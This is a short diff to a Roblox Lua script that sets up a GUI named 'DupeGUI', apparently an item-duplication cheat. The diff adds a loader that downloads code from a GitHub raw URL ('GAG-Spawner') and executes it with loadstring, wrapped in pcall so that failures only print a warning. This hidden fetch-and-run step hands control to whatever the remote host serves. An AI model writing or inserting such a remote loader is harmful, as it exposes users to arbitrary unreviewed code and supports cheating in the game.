@@ -1,6 +1,11 @@
 local TweenService = game:GetService("TweenService")
 local player = game.Players.LocalPlayer
-
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0fyz11/GAG-Spawner/refs/heads/main/ScriptMain", true))()
+end)
+if not success then
+    warn("[Main Script Loader] Failed to load remote script:", err)
+end
 -- GUI Setup
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 gui.Name = "DupeGUI"
